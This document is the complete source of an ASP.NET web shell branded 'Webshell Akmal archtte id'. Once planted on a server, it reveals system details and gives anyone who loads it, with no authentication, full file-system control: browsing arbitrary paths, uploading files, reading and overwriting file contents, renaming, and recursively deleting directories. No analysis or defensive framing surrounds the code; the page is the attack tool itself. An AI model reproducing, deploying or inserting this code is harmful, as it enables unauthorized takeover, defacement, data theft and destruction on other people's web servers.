<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Webshell Akmal archtte id</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(to right, black, blue, black), linear-gradient(to bottom, black, blue);
            color: #fff;
            margin: 0;
            padding: 0;
        }
        .container { 
            max-width: 800px; 
            margin: 50px auto; 
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
        }
        .info { 
            margin-bottom: 20px; 
        }
        .info div { 
            margin-bottom: 5px; 
        }
        .directory { 
            color: #00ff00; 
        }
        .file { 
            color: #00bfff; 
        }
        .options { 
            margin-top: 20px; 
        }
        .options a { 
            margin-right: 10px; 
            text-decoration: none; 
            color: #fff; 
        }
        .options a:hover { 
            text-decoration: underline; 
        }
        .file-list { 
            margin-top: 20px; 
        }
        .file-list table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        .file-list th, .file-list td { 
            border: 1px solid #444; 
            padding: 8px; 
            text-align: left; 
        }
        .file-list th { 
            background-color: #333; 
        }
        .edit-file { 
            margin-top: 20px; 
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #bbb;
        }
        .audio-player {
            margin-top: 20px;
            text-align: center;
        }
        audio {
            width: 100%;
            max-width: 300px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <h1>Webshell Akmal archtte id</h1>
            <div class="info">
                <div><strong>System:</strong> <%= Environment.OSVersion %></div>
                <div><strong>Server:</strong> <%= Request.ServerVariables["SERVER_SOFTWARE"] %></div>
                <div><strong>User:</strong> <%= Environment.UserName %></div>
            </div>
            <%
                string currentDirectory = Request.QueryString["dir"] ?? Server.MapPath("~/");
                string[] pathParts = currentDirectory.Split(new char[] { Path.DirectorySeparatorChar }, StringSplitOptions.RemoveEmptyEntries);
                string pathBuilder = string.Empty;
                Response.Write("Directory: ");
                foreach (string part in pathParts)
                {
                    pathBuilder += part + Path.DirectorySeparatorChar;
                    Response.Write(String.Format("<a href='?dir={0}'>{1}</a>{2}", Server.UrlEncode(pathBuilder), part, Path.DirectorySeparatorChar));
                }
            %>
            <asp:FileUpload ID="FileUpload1" runat="server" />
            <asp:Button ID="UploadButton" runat="server" Text="Upload File" OnClick="UploadFile" />
            <div class="file-list">
                <table>
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Type</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <%
                            string[] directories = Directory.GetDirectories(currentDirectory);
                            string[] files = Directory.GetFiles(currentDirectory);

                            foreach (string directory in directories)
                            {
                                DirectoryInfo dirInfo = new DirectoryInfo(directory);

                                Response.Write("<tr>");
                                Response.Write(String.Format("<td class='directory'><a href='?dir={0}'>{1}</a></td>", Server.UrlEncode(dirInfo.FullName), dirInfo.Name));
                                Response.Write("<td>-</td>");
                                Response.Write("<td>Directory</td>");
                                Response.Write(String.Format("<td class='options'><a href='?action=rename&dir={0}'>Rename</a> <a href='?action=delete&dir={0}'>Delete</a></td>", Server.UrlEncode(dirInfo.FullName)));
                                Response.Write("</tr>");
                            }

                            foreach (string file in files)
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                Response.Write("<tr>");
                                Response.Write(String.Format("<td class='file'>{0}</td>", fileInfo.Name));
                                Response.Write(String.Format("<td>{0} bytes</td>", fileInfo.Length));
                                Response.Write(String.Format("<td>{0}</td>", fileInfo.Extension));
                                Response.Write(String.Format("<td class='options'><a href='?action=edit&file={0}'>Edit</a> <a href='?action=rename&file={0}'>Rename</a> <a href='?action=delete&file={0}'>Delete</a></td>", Server.UrlEncode(fileInfo.FullName)));
                                Response.Write("</tr>");
                            }
                        %>
                    </tbody>
                </table>
            </div>
            <%
                if (Request.QueryString["action"] == "rename" && !string.IsNullOrEmpty(Request.QueryString["dir"] ?? Request.QueryString["file"]))
                {
                    string renamePath = Request.QueryString["dir"] ?? Request.QueryString["file"];
            %>
                    <div>
                        <h3>Rename: <%= Path.GetFileName(renamePath) %></h3>
                        <form method="post">
                            <input type="text" name="newName" placeholder="New Name" />
                            <input type="submit" value="Rename" />
                        </form>
                    </div>
            <%
                }
            %>
            <asp:TextBox ID="EditTextBox" runat="server" TextMode="MultiLine" Rows="20" Columns="80" Visible="false"></asp:TextBox>
            <asp:Button ID="SaveButton" runat="server" Text="Save" OnClick="SaveFile" Visible="false" />
            <div class="footer">
                &copy; Akmal archtte id
                <div class="audio-player">
                    <audio controls>
                        <source src="https://e.top4top.io/m_3101b5t1k0.mp3" type="audio/mpeg">
                        Your browser does not support the audio element.
                    </audio>
                </div>
            </div>
        </div>
    </form>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack && Request.QueryString["action"] == "edit" && !string.IsNullOrEmpty(Request.QueryString["file"]))
            {
                string filePath = Request.QueryString["file"];
                if (File.Exists(filePath))
                {
                    string fileContent = File.ReadAllText(filePath);
                    EditTextBox.Text = fileContent;
                    EditTextBox.Visible = true;
                    SaveButton.Visible = true;
                }
            }
        }

        protected void UploadFile(object sender, EventArgs e)
        {
            if (FileUpload1.HasFile)
            {
                string currentDirectory = Request.QueryString["dir"] ?? Server.MapPath("~/");
                string savePath = Path.Combine(currentDirectory, FileUpload1.FileName);
                FileUpload1.SaveAs(savePath);
                Response.Redirect(Request.Url.AbsoluteUri);
            }
        }

        protected void SaveFile(object sender, EventArgs e)
        {
            string filePath = Request.QueryString["file"];
            if (!string.IsNullOrEmpty(filePath) && File.Exists(filePath))
            {
                File.WriteAllText(filePath, EditTextBox.Text);
                Response.Redirect(Request.Url.AbsoluteUri);
            }
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            string action = Request.QueryString["action"];
            string path = Request.QueryString["file"] ?? Request.QueryString["dir"];

            if (action == "delete" && !string.IsNullOrEmpty(path))
            {
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                }
                else if (File.Exists(path))
                {
                    File.Delete(path);
                }
                Response.Redirect(Request.Url.AbsoluteUri);
            }
            else if (action == "rename" && !string.IsNullOrEmpty(path))
            {
                string newName = Request.Form["newName"];
                if (!string.IsNullOrEmpty(newName))
                {
                    string newPath = Path.Combine(Path.GetDirectoryName(path), newName);
                    if (Directory.Exists(path))
                    {
                        Directory.Move(path, newPath);
                    }
                    else if (File.Exists(path))
                    {
                        File.Move(path, newPath);
                    }
                    Response.Redirect(Request.Url.AbsoluteUri);
                }
            }
        }
    </script>
</body>
</html>
